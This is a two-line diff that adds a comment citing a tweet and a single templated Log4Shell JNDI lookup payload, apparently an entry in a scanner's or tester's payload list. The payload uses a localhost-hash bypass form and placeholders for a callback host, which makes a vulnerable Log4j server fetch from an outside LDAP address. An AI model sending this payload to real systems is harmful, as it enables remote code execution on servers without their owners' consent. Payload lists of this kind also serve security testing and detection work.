@@ -1,0 +1,2 @@
+# https://twitter.com/marcioalm/status/1471740771581652995
+${jndi:ldap://127.0.0.1#{{ .CADDR }}/{{ .Resource }}} 
